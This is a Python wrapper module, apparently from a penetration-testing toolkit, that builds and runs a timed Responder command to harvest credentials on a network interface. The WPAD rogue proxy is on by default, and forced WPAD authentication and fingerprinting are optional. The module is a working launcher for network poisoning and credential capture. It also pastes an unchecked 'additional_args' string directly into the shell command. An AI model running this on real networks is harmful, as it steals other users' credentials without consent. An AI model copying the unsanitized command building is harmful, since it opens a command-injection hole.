"""
Execute Responder for credential harvesting with enhanced logging.

Args:
    interface: Network interface to use
    analyze: Analyze mode only
    wpad: Enable WPAD rogue proxy
    force_wpad_auth: Force WPAD authentication
    fingerprint: Fingerprint mode
    duration: Duration to run in seconds
    additional_args: Additional Responder arguments

Returns:
    Credential harvesting results

Category: network
"""

from __future__ import annotations

import sys
from pathlib import Path
from typing import Any

_ROOT = Path(__file__).resolve().parents[2]
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

from _core.runner import default_parse, run_tool
from _core.result import ToolResult

TOOL_NAME = "responder_credential_harvest"
CATEGORY = "network"

def build_command(**params: Any) -> str:
    """Build CLI command."""
    interface = params.get("interface", "eth0")
    analyze = params.get("analyze", False)
    wpad = params.get("wpad", True)
    force_wpad_auth = params.get("force_wpad_auth", False)
    fingerprint = params.get("fingerprint", False)
    duration = params.get("duration", 300)  # 5 minutes default
    additional_args = params.get("additional_args", "")
    command = f"timeout {duration} responder -I {interface}"
    if analyze:
        command += " -A"
    if wpad:
        command += " -w"
    if force_wpad_auth:
        command += " -F"
    if fingerprint:
        command += " -f"
    if additional_args:
        command += f" {additional_args}"
    return command.strip()

def parse(result: ToolResult) -> dict[str, Any]:
    return default_parse(result)

def run(interface: str = 'eth0', analyze: bool = False, wpad: bool = True, force_wpad_auth: bool = False, fingerprint: bool = False, duration: int = 300, additional_args: str = '', use_recovery: bool = True, use_cache: bool = True, exec_timeout: int = 300) -> dict[str, Any]:
    params = {"interface": interface, "analyze": analyze, "wpad": wpad, "force_wpad_auth": force_wpad_auth, "fingerprint": fingerprint, "duration": duration, "additional_args": additional_args}
    command = build_command(**params)
    return run_tool(
        TOOL_NAME,
        command,
        params=params,
        timeout=exec_timeout,
        use_cache=use_cache,
        use_recovery=use_recovery,
        parse_fn=parse,
    )
